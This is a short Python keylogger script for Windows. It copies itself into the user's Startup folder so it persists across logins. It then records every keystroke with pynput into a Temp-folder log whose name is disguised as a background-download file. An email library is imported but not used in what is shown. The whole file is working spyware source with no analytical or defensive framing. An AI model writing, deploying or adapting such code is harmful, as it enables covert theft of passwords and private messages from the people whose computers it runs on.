from pynput.keyboard import Key, Listener
import logging
import os  
import shutil
import smtplib
import getpass



user = (getpass.getuser())
print(os.path.expanduser('~\Desktop\logger.py'))
print(user)
pathdesk = os.path.join(r'C:\Users',getpass.getuser(),'Desktop','logger.py')
pathstart = os.path.join(r'C:\Users',getpass.getuser(),'AppData','Roaming','Microsoft','Windows','Start Menu','Programs','Startup')
pathstore = os.path.join(r'C:\Users',getpass.getuser(),'AppData','Local','Temp')

for x in range(0,1):
    if os.path.exists(pathdesk):
        shutil.copy2('logger.py', pathstart)
        print ("working")
    else:
        print ("File Not Found")
        pass

log_dir = pathstore

logging.basicConfig(filename=(log_dir + "\dd_BackgroundDownload_2019040518349.log"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

